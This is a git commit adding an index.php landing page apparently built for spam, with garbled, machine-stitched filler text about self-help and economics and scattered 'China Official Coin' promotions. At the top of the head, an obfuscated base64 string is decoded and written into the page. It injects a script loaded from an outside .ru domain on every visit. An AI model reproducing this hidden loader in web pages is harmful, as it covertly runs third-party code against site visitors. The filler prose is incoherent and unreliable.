f899fc4a6046622e81b63707fbfea37e0e5afc5b
fypymehj <81928424+fypymehj@users.noreply.github.com>
2021-04-04 22:19:43 +0300

    Add files via upload

---
+++ index.php
@@ -0,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl90dnZxcGdjd3JpNm50MnhpMmYiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>I enjoy life.  - Then maybe you should try to conclude a Win / Win agreement wit</title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+</head>
+
+<body>
+
+	<header class="gcmetpcdk2y7hf2iyysx">
+		<nav>
+			<li><a href="#">MAIN</a></li>
+			<li><a href="our_themes.html">OUR THEMES</a></li>
+			<li><a href="flow.html">FLOW</a></li>
+			<li><a href="#">E-MAIL</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero" class="8qzgo8ay9r1kwfk1jf5ppwux">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>I enjoy life.  - Then maybe you should try to conclude a Win / Win agreement wit</h1>
+	</section>
+
+
+	<section class="our-work" class="ibl3elqvnbu3e6pqyt">
+		<h3 class="title">Cost inflation is expressed in price increases due </h3>
+		<p>We can subordinate our feelings to our values. China Official Coin: Singapore, South Korea, Malaysia.  It is obvious that these matters are important, very important, but not urgent.  But I still did not find an answer to the question that worried me, "What caused this attitude?" - Pay attention, we are very seriously dealing with this problem, - said the president, - All department heads are models for their employees.  But even this will require efforts.  If you are only concerned with the interests of your own personality, your affairs are not going very well - and this is a law as immutable as the law of gravity.  She writes us letters full of love. </p>
+		<hr>
+
+		<ul class="grid" class="afvo5x0vn2pmf297pnqmxv">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+<table class="brd" class="ibl3elqvnbu3e6pqyt">
+  <tr>
+    <th>n/n</th>
+    <th>A</th>
+    <th>B</th>
+    <th>C</th>
+  </tr>
+  <tr>
+    <td>1</td>
+    <td>The nominal wages include: - payment accrued to employees for the hours worked, the quantity and quality of work performed; - payment a</td>
+    <td>I am very worried.  1), we note that the larger the elasticity coefficient, the flatter the demand curve.  But for now, let m</td>
+    <td>In this hotel, I understood even more deeply the meaning of the motto “Individual approach to everyone”.  My experience tells me that sometime</td>
+  </tr>
+  <tr>
+    <td>2</td>
+    <td>He handed one bag to me:- Could you collect this? He pointed to the remnants of the Sunday BBQ trash.  And because they are not urgent, you don't.  For</td>
+    <td>Interdependence is a much more mature, more progressive concept.  Sometimes, in order to live according to the principles and in accordance with the</td>
+    <td>And the spiritual dimension is associated with understanding the meaning of the organization's activities through the definition of i</td>
+  </tr>
+  <tr>
+    <td>3</td>
+    <td>And yet we both have lived within our paradigms for many years, consider them "objective" and question the character and </td>
+    <td>" Now I can visualize it.  This is the story of Joseph, who, at the age of seventeen, was sold into slavery in Egypt by his brothers</td>
+    <td>The state promptly informs the enterprise about all decisions taken by the authorities and new regulations.  The same applies to parenting.  It also includes the a</td>
+  </tr>
+</table>
+
+
+	<section class="our-work" class="gcmetpcdk2y7hf2iyysx">
+		<h3 class="title">At the same time, there can be no stable i</h3>
+		<p>People who are focused on work can become “workaholics”, trying to work hard at the expense of health, friendships and other important aspects of our lives.  The point is that you could make the same choice, starting from different centers, and you would not be effective.  Consequently, things are going better than ever.  I would like him to know that I was not perfect, but tried to do everything in my power.  2.  The concept of "deal" directly brings us to the concept of "market".  We define what is a contribution,based on our own needs and desires, which we have at the present time, or had when we were at the same age or were in the same stage of life.  By comparing any two sets, the consumer may prefer one product over the other.  Public finance is a means of redistributing the value of the social product and part of the national wealth.  As I pondered more deeply the difference between Personality Ethics and Character Ethics, I realized that Sandra and I received social satisfaction from the good behavior of our children. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="8qzgo8ay9r1kwfk1jf5ppwux" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ibl3elqvnbu3e6pqyt">
+		<h3 class="title">We can do it in the course of our normal, everyday interaction </h3>
+		<p>Thus, demand is the desire and ability of buyers to purchase goods and services at certain prices, which can be written in the form of the formula: D = P? Q, where P is the price; Q is the number of goods and services.The graph contains seven options for demand for a product, depending on its price. Chinese Coin: Sales Open In Today.  The transaction presupposes the presence of several conditions: 1) two valuable objects; 2) the agreed conditions for its implementation; 3) the agreed time of the commission; 4) the agreed venue.  The difficulty lies in assessing the situation accurately and not trying to apply only “Win ​​/ Lose” or some other scenario every time.  Irrecoverable costs are incurred by the firm once and for all and cannot be reimbursed even if the firm completely ceases to operate in this area.If a firm plans to start working in some new direction of business for itself or expand its operations, then the sunk costs associated with this decision are precisely the opportunity costs associated with starting a new activity.  Estimating elasticity in percentage terms avoids confusion and builds a single indicator for all cases.This coefficient is called the coefficient of elasticity. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="afvo5x0vn2pmf297pnqmxv" style="background-image: url(image3.jpg);"></li>
+			<li class="large" class="afvo5x0vn2pmf297pnqmxv" style="background-image: url(image8.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="gcmetpcdk2y7hf2iyysx">
+		<h3 class="title">P / PC balance is the definition of efficiency.  Th</h3>
+		<p>See what a jumble of colors and shades? This is not what we want.  Foreign capital can contribute to the development of domestic investment.  If just ten seconds of looking at a picture can have such an impact on how we see an object, then what can we say about the power of the influence of our life experience! Everything in our life that can influence - family, school, church, colleagues, friends, friends and such modern social paradigms as the Ethics of Personality - all this has an unconscious impact on us, contributing to the formation of our own belief system, our paradigms , our cards.  Each of us knows people who, finding themselves in very difficult circumstances,suffering from a lingering illness or having received a severe physical injury, they retain amazing vitality.  Your ability to act extends far beyond your own resources, which contributes to a high level of interdependence.Your current financial condition and other momentary circumstances are not decisive for your decisions and actions.  2a).  - Honey, - said the husband, - this is your problem.  Difficult situations often cause paradigm shifts, change people's outlook on the world, on themselves and others in the world, and what life demands of them.  5.  It is the risks that determine the appropriation of net profit by the entrepreneur, since otherwise all the losses fall on him.  As a result, new, shared goals are created, and everything develops, and often in a way that no one could expect. </p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" class="8qzgo8ay9r1kwfk1jf5ppwux" style="background-image: url(image4.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work" class="ibl3elqvnbu3e6pqyt">
+		<h3 class="title">Instead of living according to scripts pas</h3>
+		<p>" They are not really independent.  Delegation of Execution There are two main types of delegation: "execution delegation" and "management delegation".  The final agenda should be drawn up by the Chairperson and should focus primarily on Quadrant II issues, which usually require more creative thinking.unlike the Square I questions, which involve a more mechanical solution.  Such organizations were a kind of social experiment, their value system did not contain an economic criterion.  Here income and demand change in the opposite direction.  The constant renewal of this support targets them in so-called "rent seeking" - efforts to obtain various privileges from the authorities, which weaken the efforts to improve the competitiveness of products in the market.and with great compliance of the authorities, they make them not at all necessary.  The dependence of demand on consumer choice is obvious.  62.  The amount of the share is recorded in the certificate, and its owner has the right to profit.  Defining roles.  - If I understand you correctly, do you want your boss to completely change his leadership style, and you yourself do not want to change even your way of presenting views? - In general, yes ... </p>
+		<hr>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="afvo5x0vn2pmf297pnqmxv" class="title">According to the economic purpose, firms are divided into produ</h3>	
+		<p>The law of justice is immutable, and the more closely we connect ourselves with the correct principles, the more accurately we will be able to judge how the world works,and the more accurate will be our paradigms - maps, thanks to which we orient ourselves in life. China Official Coin: Singapore, South Korea, Malaysia.  The advantages of a joint stock company: 1) the ability to attract large-scale financial resources required for large-scale production;2) exit from the joint-stock company of one of the participants does not lead to a halt in production; 3) use hired managers who are able to effectively and professionally resolve any issues; 4) the joint stock company is a limited liability company.  How much easier it is to blame other people, environment, living conditions for your plight.  Indeed, without education in our world you cannot go far.  Failure to meet sales targets, growing unpaid invoices, and low turnover are all signals or symptoms of deeper problems.  Therefore, the state seeks to ensure full employment of the able-bodied population, regulates the labor market, for which it creates appropriate employment services, organizes new jobs, retraining and retraining of the labor force, etc.  Once the problem is identified, research objectives can be formulated.  The strictest rules were already in place - do not pry and leave the conversation if it is too painful for one or both parties.  That is, from the point of view of the behavior of buyers, demand is the desire and ability of people to buy goods or a certain ratio of the quantities of goods that are bought, and the costs of buyers - carriers of demand for the acquisition of this amount of goods. </p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="-Email">
+			<input type="Name" placeholder="-Name">
+			<input type="Surmane" placeholder="-Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer class="gcmetpcdk2y7hf2iyysx">
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square" class="8qzgo8ay9r1kwfk1jf5ppwux"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square" class="ibl3elqvnbu3e6pqyt"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square" class="afvo5x0vn2pmf297pnqmxv"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>25846 Adam Burg, Suite 442, 48612-6227, East Wilson, Kentucky, United States</p>
+		<p>Phone number: +07383477408176</p>
+	</footer>
+
+</body>
+
+</html>
